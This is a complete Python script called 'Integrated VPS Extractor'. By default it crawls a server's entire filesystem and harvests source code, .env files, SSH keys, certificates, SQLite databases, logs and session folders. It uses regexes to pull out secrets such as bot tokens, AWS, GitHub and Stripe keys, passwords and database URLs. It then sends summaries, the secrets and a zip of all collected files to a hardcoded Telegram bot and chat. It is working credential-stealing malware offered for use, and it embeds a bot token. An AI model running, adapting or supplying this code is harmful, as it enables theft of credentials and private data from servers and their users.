#!/usr/bin/env python3
"""
INTEGRATED VPS EXTRACTOR — FINAL (FIXED)
- No empty folders in exfil/ or ZIP
- Secrets deduplicated (same token appears once, with file list)
- Scans entire root directory (/) by default
- Extracts: .py, .js, .ts, .go, .rs, .java, .sh, .bash, .json, .yml, .env
- Extracts: databases, uploads, containers, backups, logs, sessions, inf
- Extracts: tokens, keys, passwords, configs
- Auto-detects bot directory or takes custom path
"""

import os
import sys
import re
import json
import shutil
import socket
import sqlite3
import zipfile
import subprocess
from pathlib import Path
from datetime import datetime
from io import BytesIO
from collections import defaultdict

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)

# ========================================
# CONFIG
# ========================================

BOT_TOKEN = "8676256487:AAFMD07gY8a368Xs4gNJ1atm4yjY34SmoNk"
CHAT_ID = "5628671567"

# Default: scan entire VPS
TARGET_ROOT = Path("/")

# Max file size
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
MAX_FILES = 10000

# ========================================
# SKIP DIRECTORIES — added more system paths
# ========================================

SKIP_DIRS = {
    'proc', 'sys', 'dev', 'run', 'tmp', 'cache', '.cache',
    '.git', '.venv', 'venv', 'node_modules', '__pycache__',
    'exfil', 'snap', 'boot', 'lib', 'lib64',
    'usr',            # <-- skip /usr entirely (system libs)
    'etc',            # <-- skip /etc (system configs)
    'opt',            # <-- skip /opt (optional packages)
    'var',            # <-- skip /var (logs, cache, spool)
    'usr/lib', 'usr/share', 'usr/include',
    'var/lib/dpkg', 'var/cache', 'var/log',
    'var/backups', 'var/lib/apt', 'var/lib/update-rc.d',
    'docker', 'containers', '.npm', '.local', 'share',
    'test', 'tests', 'examples', 'docs', 'doc',
    'lost+found', '.trash', '.Trash', 'mnt', 'media',
    'root',           # <-- skip /root (system admin home)
    'home'            # <-- we keep /home for user data, but we'll let it pass
}

# ========================================
# TARGET PATTERNS (unchanged)
# ========================================

EXFIL_TARGETS = [
    # Python
    "*.py", "*.pyc", "pyo", "*.pyenc",
    # JavaScript / TypeScript
    "*.js", "*.jsx", "*.ts", "*.tsx", "*.mjs", "*.cjs",
    # Other languages
    "*.go", "*.rs", "*.java", "*.kt", "*.scala", "*.rb", "*.php",
    # Scripts
    "*.sh", "*.bash", "*.zsh", "*.fish", "*.ps1",
    # Config files
    "*.json", "*.yml", "*.yaml", "*.toml", "*.ini", "*.cfg",
    "*.conf", "*.config", "*.xml", "*.properties", "*.hcl",
    # Environment
    ".env", ".env.*", "*.env", "env", "environment",
    # Secrets
    ".secrets", "secrets", "secret", "credentials",
    # Git
    ".gitignore", ".gitattributes", ".gitmodules",
    # Keys & certs
    "*.pem", "*.key", "*.crt", "*.csr", "*.p12", "*.pfx",
    "id_rsa", "id_rsa.pub", "id_ed25519", "id_ecdsa",
    "authorized_keys", "known_hosts",
    # Bot files
    "bot.py", "main.py", "app.py", "run.py", "start.py",
    "index.js", "server.js", "app.js", "main.js", "bot.js",
    "telegram_bot.py", "tg_bot.py", "handler.py", "handlers.py",
    "config.py", "settings.py", "secrets.py", "credentials.py",
    "database.py", "db.py", "models.py", "utils.py", "helpers.py",
    # Package files
    "requirements.txt", "package.json", "package-lock.json",
    "Pipfile", "Pipfile.lock", "poetry.lock", "pyproject.toml",
    "setup.py", "setup.cfg", "MANIFEST.in",
    # Docker
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    ".dockerignore",
    # Database files
    "*.db", "*.sqlite", "*.sqlite3",
    # Other
    "*.sql", "*.dump", "*.backup", "*.log"
]

# Upload directories
UPLOAD_DIRS = [
    "upload_bots", "uploads", "scripts", "bots",
    "user_scripts", "user_files", "files", "data",
    "storage", "media", "downloads", "temp", "containers",
    "backups", "logs", "sessions", "inf"
]

# ========================================
# SECRET PATTERNS (unchanged)
# ========================================

SECRET_PATTERNS = [
    (r'\b\d{7,12}:[A-Za-z0-9_-]{30,}\b', 'BOT_TOKEN'),
    (r"TOKEN\s*=\s*['\"]([^'\"]+)['\"]", 'BOT_TOKEN'),
    (r"BOT_TOKEN\s*=\s*['\"]([^'\"]+)['\"]", 'BOT_TOKEN'),
    (r'(?i)(?:api[_-]?key|apikey|api_key)\s*[:=]\s*[\'"]?([A-Za-z0-9_\-]{20,})[\'"]?', 'API_KEY'),
    (r'(?i)(?:api[_-]?key|apikey|api_key)\s*[:=]\s*([A-Za-z0-9_\-]{20,})', 'API_KEY'),
    (r'\bAKIA[0-9A-Z]{16}\b', 'AWS_ACCESS_KEY'),
    (r'\bASIA[0-9A-Z]{16}\b', 'AWS_TEMP_KEY'),
    (r'(?i)(?:aws_?secret|secret_key|aws_secret_access_key)\s*[:=]\s*[\'"]?([A-Za-z0-9/+=]{40})[\'"]?', 'AWS_SECRET'),
    (r'\b(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36}\b', 'GITHUB_TOKEN'),
    (r'-----BEGIN (?:RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY-----', 'PRIVATE_KEY'),
    (r'-----BEGIN OPENSSH PRIVATE KEY-----', 'OPENSSH_KEY'),
    (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*[\'"]?([^\'"\s]{4,})[\'"]?', 'PASSWORD'),
    (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*([^\'"\s]{4,})', 'PASSWORD'),
    (r'https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+', 'DISCORD_WEBHOOK'),
    (r'postgresql://[^\s\'"]+', 'POSTGRES_URL'),
    (r'mysql://[^\s\'"]+', 'MYSQL_URL'),
    (r'mongodb://[^\s\'"]+', 'MONGODB_URL'),
    (r'redis://[^\s\'"]+', 'REDIS_URL'),
    (r'sqlite:///[^\s\'"]+', 'SQLITE_URL'),
    (r'(?i)(?:database|db|dsn)\s*[:=]\s*[\'"]?([^\'"\s]{10,})[\'"]?', 'DATABASE_URL'),
    (r'\bxox[baprs]-[A-Za-z0-9-]{50,}\b', 'SLACK_TOKEN'),
    (r'\b(sk_live|pk_live|sk_test|pk_test)_[A-Za-z0-9]{24,}\b', 'STRIPE_KEY'),
    (r'\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\b', 'JWT'),
    (r'OWNER_ID\s*=\s*(\d+)', 'OWNER_ID'),
    (r'ADMIN_ID\s*=\s*(\d+)', 'ADMIN_ID'),
    (r'CHAT_ID\s*=\s*(\d+)', 'CHAT_ID'),
    (r'USER_ID\s*=\s*(\d+)', 'USER_ID'),
    (r'(?i)(?:secret|token|key|credential)\s*[:=]\s*[\'"]?([A-Za-z0-9_\-]{16,})[\'"]?', 'GENERIC_SECRET'),
    (r'(?i)(?:secret|token|key)\s*[:=]\s*([A-Za-z0-9_\-]{16,})', 'GENERIC_SECRET'),
    (r'https://[A-Za-z0-9]+:[A-Za-z0-9]+@[^\s\'"]+', 'API_URL_WITH_CREDS'),
    (r'(?i)(?:npm|node)_?token\s*[:=]\s*[\'"]?([^\'"\s]{20,})[\'"]?', 'NPM_TOKEN'),
    (r'(?i)(?:NEXT_PUBLIC_|REACT_APP_|VUE_APP_|VITE_)[A-Z_]+', 'ENV_VAR'),
]

# ========================================
# TELEGRAM FUNCTIONS (Markdown fix)
# ========================================

def send_to_telegram(text: str, files: list = None):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                requests.post(url, data={"chat_id": CHAT_ID, "text": text[i:i+4000], "parse_mode": "Markdown"}, timeout=10)
        else:
            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
        print("[+] Message sent")
    except Exception as e:
        print(f"[-] Message error: {e}")
        return False

    if files:
        for file_path in files[:30]:
            try:
                if os.path.getsize(file_path) > 20 * 1024 * 1024:
                    continue
                with open(file_path, 'rb') as f:
                    resp = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        data={"chat_id": CHAT_ID},
                        files={"document": f},
                        timeout=30
                    )
                if resp.status_code == 200:
                    print(f"[+] Sent: {os.path.basename(file_path)}")
            except Exception as e:
                print(f"[-] Failed: {file_path} -> {e}")
    
    return True

def send_zip(file_paths: list, name: str = None):
    if not file_paths:
        return
    
    if name is None:
        name = f"vps_extract_{socket.gethostname()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    
    try:
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for fp in file_paths[:500]:
                try:
                    # Use relative path for better structure (optional)
                    zipf.write(fp, os.path.basename(fp))
                except Exception:
                    continue
        
        zip_buffer.seek(0)
        resp = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={"chat_id": CHAT_ID},
            files={"document": (name, zip_buffer, "application/zip")},
            timeout=120
        )
        if resp.status_code == 200:
            print(f"[+] Zip sent: {name} ({len(file_paths)} files)")
            return True
        else:
            print(f"[-] Zip failed: {resp.text}")
            return False
    except Exception as e:
        print(f"[-] Zip error: {e}")
        return False

# ========================================
# TARGET DETECTION
# ========================================

def get_target():
    if len(sys.argv) > 1:
        target = Path(sys.argv[1])
        if target.exists():
            print(f"[*] Using specified target: {target}")
            return target
        else:
            print(f"[!] Specified target not found: {target}")
    
    print("[*] No target specified. Scanning entire VPS root (/)...")
    return Path("/")

# ========================================
# BULLETPROOF SELF-EXCLUSION
# ========================================

def is_self_script(file_path: Path, self_path: Path) -> bool:
    try:
        if file_path.resolve() == self_path.resolve():
            return True
        if file_path.absolute() == self_path.absolute():
            return True
        if os.path.exists(file_path) and os.path.exists(self_path):
            if os.path.samefile(file_path, self_path):
                return True
        if file_path.name == self_path.name:
            if file_path.parent.resolve() == self_path.parent.resolve():
                return True
        if file_path.parent == self_path.parent and file_path.name == self_path.name:
            return True
    except Exception:
        pass
    return False

# ========================================
# EXTRACTION ENGINE — deduplicated secrets
# ========================================

def is_text_file(file_path: Path) -> bool:
    try:
        with open(file_path, 'rb') as f:
            chunk = f.read(8192)
        return b'\0' not in chunk
    except:
        return False

def extract_secrets_from_file(file_path: Path) -> list:
    """Extract secrets from a file, deduplicate within the file."""
    secrets = []
    try:
        if file_path.suffix in {'.pyenc', '.pem', '.key', '.crt', '.p12', '.pfx', '.so', '.dll', '.exe'}:
            return secrets

        if file_path.stat().st_size > 5 * 1024 * 1024:
            return secrets

        if not is_text_file(file_path):
            return secrets

        content = file_path.read_text(encoding='utf-8', errors='ignore')

        # Keep track of seen values in this file to avoid duplicates
        seen_values = set()

        for pattern, name in SECRET_PATTERNS:
            matches = re.findall(pattern, content)
            if matches:
                if isinstance(matches[0], tuple):
                    matches = [m[0] for m in matches if m]
                for m in matches[:5]:
                    # Normalize value: strip whitespace, keep as is (case-sensitive)
                    val = str(m).strip()
                    if val and len(val) > 3:
                        # Create a key for deduplication: value + type (to allow same value with different type if ever needed)
                        key = (val, name)
                        if key not in seen_values:
                            seen_values.add(key)
                            secrets.append({
                                "type": name,
                                "value": val[:200],
                                "file": str(file_path)
                            })
    except Exception:
        pass
    
    return secrets

# ========================================
# DATABASE EXTRACTION
# ========================================

def extract_database(db_path: Path) -> dict:
    data = {}
    if not db_path.exists():
        return data
    
    try:
        conn = sqlite3.connect(str(db_path))
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()
        for table in tables:
            table_name = table[0]
            try:
                cursor.execute(f"SELECT * FROM {table_name}")
                rows = cursor.fetchall()
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = [col[1] for col in cursor.fetchall()]
                data[table_name] = {
                    "columns": columns,
                    "rows": rows,
                    "count": len(rows)
                }
                print(f"[+] Table: {table_name} ({len(rows)} rows)")
            except Exception as e:
                print(f"[-] Table error: {table_name} -> {e}")
        conn.close()
        print(f"[+] DB extracted: {len(data)} tables from {db_path.name}")
    except Exception as e:
        print(f"[-] DB error: {e}")
    
    return data

# ========================================
# MAIN SCANNER — now removes empty dirs before zipping
# ========================================

def scan_target(target_dir: Path) -> dict:
    result = {
        "bot_files": [],
        "user_scripts": [],
        "config_files": [],
        "databases": [],
        "db_data": {},
        "secrets": [],
        "exfiltrated": [],
        "found_tokens": [],
        "js_files": [],
        "py_files": [],
        "env_files": [],
        "git_files": [],
        "uploads": [],
        "upload_bots": [],
        "containers": [],
        "backups": [],
        "logs": [],
        "sessions": [],
        "inf_files": [],
        "errors": [],
        "stats": {}
    }
    
    self_path = Path(__file__).resolve()
    script_name = self_path.name
    
    print(f"[*] Script: {self_path}")
    print(f"[*] Excluding: {script_name}")
    
    exfil_dir = Path("exfil")
    exfil_dir.mkdir(exist_ok=True)
    
    file_count = 0
    exfil_count = 0
    skipped_self = 0
    
    # Use a set to track all files copied (for later removing empty dirs)
    copied_files = []
    
    # Walk the directory
    for dirpath, dirnames, filenames in os.walk(target_dir):
        # Skip system dirs
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        
        # Also skip exfil directory
        if "exfil" in dirpath:
            continue
        
        for fname in filenames:
            file_count += 1
            if file_count % 2000 == 0:
                print(f"[*] Scanned {file_count} files...")
            if file_count > MAX_FILES:
                print(f"[*] Reached MAX_FILES ({MAX_FILES})")
                break
            
            path = Path(dirpath) / fname
            
            # ─── BULLETPROOF SELF-EXCLUSION ─────────────────────
            if is_self_script(path, self_path):
                skipped_self += 1
                if skipped_self == 1:
                    print(f"[*] Skipping self: {path}")
                continue
            
            # Skip exfil folder (extra safety)
            if "exfil" in str(path):
                continue
            
            # Check if target file
            is_target = is_target_file(path)
            is_upload = is_upload_script(path)
            is_env = fname.startswith('.env') or fname.endswith('.env')
            is_git = fname in ['.gitignore', '.gitattributes', '.gitmodules']
            is_js = fname.endswith(('.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs'))
            is_py = fname.endswith(('.py', '.pyc', '.pyo', '.pyenc'))
            is_db = fname.endswith(('.db', '.sqlite', '.sqlite3'))
            
            if not is_target and not is_upload and not is_env and not is_git and not is_db:
                continue
            
            # Record file by category
            if is_py:
                result["py_files"].append(str(path))
            if is_js:
                result["js_files"].append(str(path))
            if is_env:
                result["env_files"].append(str(path))
            if is_git:
                result["git_files"].append(str(path))
            if is_db:
                result["databases"].append(str(path))
                db_data = extract_database(path)
                if db_data:
                    result["db_data"][fname] = db_data
            
            # Categorize
            if is_env:
                print(f"[+] .env: {path}")
            elif is_git:
                print(f"[+] .gitignore: {path}")
            elif is_db:
                print(f"[+] Database: {path}")
            elif is_bot_file(path):
                result["bot_files"].append(str(path))
                print(f"[+] Bot file: {path}")
            elif is_upload:
                result["user_scripts"].append(str(path))
                print(f"[+] User script: {path}")
            elif is_config_file(path):
                result["config_files"].append(str(path))
                print(f"[+] Config: {path}")
            else:
                print(f"[+] File: {path}")
            
            # Extract secrets from text files (deduplicated per file)
            secrets = extract_secrets_from_file(path)
            for s in secrets:
                # Add to global secrets list
                result["secrets"].append(s)
                if s["type"] == "BOT_TOKEN":
                    result["found_tokens"].append(s["value"])
                print(f"[!] SECRET: {path} -> {s['type']}: {s['value'][:50]}...")
            
            # Copy file
            try:
                # Preserve relative path structure from target root
                try:
                    rel = path.relative_to(target_dir)
                except ValueError:
                    rel = Path("other") / path.name
                
                dest = exfil_dir / rel
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(path, dest)
                result["exfiltrated"].append(str(dest))
                copied_files.append(str(dest))
                exfil_count += 1
            except Exception as e:
                result["errors"].append(f"Copy failed: {path} -> {e}")
    
    # ─── ALSO SCAN SPECIFIC DIRECTORIES ──────────────────────────
    for dir_name in ["uploads", "upload_bots", "containers", "backups", "logs", "sessions", "inf"]:
        d = target_dir / dir_name
        if d.exists():
            for f in d.rglob("*"):
                if f.is_file() and "exfil" not in str(f):
                    if is_self_script(f, self_path):
                        continue
                    if str(f) not in result["exfiltrated"]:
                        if dir_name == "uploads":
                            result["uploads"].append(str(f))
                        elif dir_name == "upload_bots":
                            result["upload_bots"].append(str(f))
                        elif dir_name == "containers":
                            result["containers"].append(str(f))
                        elif dir_name == "backups":
                            result["backups"].append(str(f))
                        elif dir_name == "logs":
                            result["logs"].append(str(f))
                        elif dir_name == "sessions":
                            result["sessions"].append(str(f))
                        elif dir_name == "inf":
                            result["inf_files"].append(str(f))
                        
                        try:
                            dest = exfil_dir / f.relative_to(target_dir)
                            dest.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(f, dest)
                            result["exfiltrated"].append(str(dest))
                            copied_files.append(str(dest))
                        except Exception:
                            pass
    
    # ─── DEDUPLICATE SECRETS GLOBALLY ────────────────────────────
    # Group secrets by (value, type) and collect file paths
    secret_map = {}
    for s in result["secrets"]:
        key = (s["value"], s["type"])
        if key not in secret_map:
            secret_map[key] = {
                "type": s["type"],
                "value": s["value"],
                "files": set()
            }
        secret_map[key]["files"].add(s["file"])
    
    # Rebuild secrets list with file list
    deduped_secrets = []
    for key, data in secret_map.items():
        deduped_secrets.append({
            "type": data["type"],
            "value": data["value"],
            "files": list(data["files"])
        })
    result["secrets"] = deduped_secrets
    
    # ─── REMOVE EMPTY DIRECTORIES FROM EXFIL ──────────────────────
    # After copying, remove any empty directories inside exfil/
    for root, dirs, files in os.walk(exfil_dir, topdown=False):
        if root == str(exfil_dir):
            continue
        if not os.listdir(root):
            try:
                os.rmdir(root)
                print(f"[*] Removed empty directory: {root}")
            except OSError:
                pass
    
    # ─── STATS ──────────────────────────────────────────────────────
    result["stats"] = {
        "scanned": file_count,
        "py_files": len(result["py_files"]),
        "js_files": len(result["js_files"]),
        "env_files": len(result["env_files"]),
        "git_files": len(result["git_files"]),
        "db_files": len(result["databases"]),
        "bot_files": len(result["bot_files"]),
        "user_scripts": len(result["user_scripts"]),
        "config_files": len(result["config_files"]),
        "uploads": len(result["uploads"]),
        "upload_bots": len(result["upload_bots"]),
        "containers": len(result["containers"]),
        "backups": len(result["backups"]),
        "logs": len(result["logs"]),
        "sessions": len(result["sessions"]),
        "inf_files": len(result["inf_files"]),
        "secrets": len(result["secrets"]),
        "exfiltrated": len(result["exfiltrated"]),
        "errors": len(result["errors"]),
        "skipped_self": skipped_self
    }
    
    # Save DB data to JSON
    if result["db_data"]:
        with open(exfil_dir / "db_export.json", "w") as f:
            json.dump(result["db_data"], f, indent=2, default=str)
        result["exfiltrated"].append(str(exfil_dir / "db_export.json"))
        print("[+] DB export saved")
    
    # Save secrets report (deduplicated)
    if result["secrets"]:
        with open(exfil_dir / "secrets_found.json", "w") as f:
            json.dump(result["secrets"], f, indent=2, default=str)
        result["exfiltrated"].append(str(exfil_dir / "secrets_found.json"))
        print("[+] Secrets report saved")
    
    return result

# ========================================
# HELPER FUNCTIONS
# ========================================

def is_target_file(path: Path) -> bool:
    fname = path.name
    for pattern in EXFIL_TARGETS:
        if '*' in pattern:
            if path.match(pattern):
                return True
    return fname in EXFIL_TARGETS

def is_bot_file(path: Path) -> bool:
    fname = path.name
    bot_names = [
        "bot.py", "main.py", "app.py", "run.py", "start.py",
        "index.js", "server.js", "bot.js", "app.js", "main.js",
        "telegram_bot.py", "tg_bot.py", "handler.py", "handlers.py"
    ]
    if fname in bot_names:
        return True
    try:
        content = path.read_text(encoding='utf-8', errors='ignore')
        if "telebot" in content or "TOKEN" in content or "updater" in content:
            return True
        if "express" in content or "app.get" in content or "app.post" in content:
            return True
    except:
        pass
    return False

def is_config_file(path: Path) -> bool:
    fname = path.name
    config_names = [
        "config.py", "settings.py", "secrets.py", "credentials.py",
        "credentials.json", "config.json", "settings.json",
        "config.js", "settings.js", "constants.js", "env.js"
    ]
    return fname in config_names

def is_upload_script(path: Path) -> bool:
    parts = path.parts
    for upload_dir in UPLOAD_DIRS:
        if upload_dir in parts:
            return True
    return False

# ========================================
# MAIN
# ========================================

def main():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║   INTEGRATED VPS EXTRACTOR — FINAL (FIXED)                         ║
║   - No empty folders in exfil/ or ZIP                              ║
║   - Secrets deduplicated (same token once, with file list)         ║
║   - Scans entire root directory (/) by default                     ║
║   - Extracts: .py, .js, .ts, .go, .rs, .java, .sh, .bash, .json  ║
║   - Extracts: databases, uploads, containers, backups, logs        ║
║   - Extracts: tokens, keys, passwords, configs                     ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    target = get_target()
    print(f"[*] Target: {target}")
    
    result = scan_target(target)
    
    # Build report
    report = {
        "timestamp": datetime.now().isoformat(),
        "hostname": socket.gethostname(),
        "target": str(target),
        "stats": result["stats"],
        "tokens": result["found_tokens"][:10],
        "secrets": result["secrets"][:30],
        "errors": result["errors"][:20],
    }
    
    with open("vps_extract_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)
    print("[+] Report saved: vps_extract_report.json")
    
    # ─── SEND TO TELEGRAM ─────────────────────────────────────────
    summary = f"""
🗄️ *INTEGRATED VPS EXTRACTOR — FINAL (FIXED)*
🖥️ Host: `{socket.gethostname()}`
📂 Target: `{target}`
📁 .py files: `{result['stats']['py_files']}`
📁 .js files: `{result['stats']['js_files']}`
🌐 .env files: `{result['stats']['env_files']}`
📄 .gitignore: `{result['stats']['git_files']}`
🗄️ Databases: `{result['stats']['db_files']}`
🤖 Bot files: `{result['stats']['bot_files']}`
📦 User scripts: `{result['stats']['user_scripts']}`
⚙️ Configs: `{result['stats']['config_files']}`
📤 Uploads: `{result['stats']['uploads']}`
📦 Upload Bots: `{result['stats']['upload_bots']}`
🐳 Containers: `{result['stats']['containers']}`
💾 Backups: `{result['stats']['backups']}`
📋 Logs: `{result['stats']['logs']}`
🔐 Sessions: `{result['stats']['sessions']}`
📁 Inf: `{result['stats']['inf_files']}`
🔑 Secrets (deduped): `{result['stats']['secrets']}`
📤 Exfiltrated: `{result['stats']['exfiltrated']}`
⚠️ Errors: `{result['stats']['errors']}`
🛡️ Skipped self: `{result['stats']['skipped_self']}`
    """
    send_to_telegram(summary)
    
    # Send tokens
    if result["found_tokens"]:
        token_msg = "🔑 *TOKENS FOUND:*\n"
        for t in result["found_tokens"][:10]:
            token_msg += f"• `{t[:50]}`\n"
        send_to_telegram(token_msg)
    
    # Send secrets (deduped)
    if result["secrets"]:
        secret_msg = "🔑 *SECRETS FOUND (deduped):*\n"
        for s in result["secrets"][:20]:
            secret_msg += f"• `{s['value'][:40]}` → *{s['type']}* in {len(s['files'])} file(s)\n"
        send_to_telegram(secret_msg)
    
    # Send all files as zip (only files, no empty dirs)
    all_files = [f for f in Path("exfil").rglob("*") if f.is_file()]
    if all_files:
        print(f"[*] Sending {len(all_files)} files as zip...")
        send_zip(all_files, f"vps_extract_{socket.gethostname()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    
    # ─── SUMMARY ────────────────────────────────────────────────────
    print(f"""
[*] Scan complete:
    .py files: {result['stats']['py_files']}
    .js files: {result['stats']['js_files']}
    .env files: {result['stats']['env_files']}
    .gitignore: {result['stats']['git_files']}
    Databases: {result['stats']['db_files']}
    Bot files: {result['stats']['bot_files']}
    User scripts: {result['stats']['user_scripts']}
    Configs: {result['stats']['config_files']}
    Uploads: {result['stats']['uploads']}
    Upload Bots: {result['stats']['upload_bots']}
    Containers: {result['stats']['containers']}
    Backups: {result['stats']['backups']}
    Logs: {result['stats']['logs']}
    Sessions: {result['stats']['sessions']}
    Inf: {result['stats']['inf_files']}
    Secrets (deduped): {result['stats']['secrets']}
    Exfiltrated: {result['stats']['exfiltrated']}
    Errors: {result['stats']['errors']}
    Skipped self: {result['stats']['skipped_self']}
[*] Report: vps_extract_report.json
[*] Files: ./exfil/
    """)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
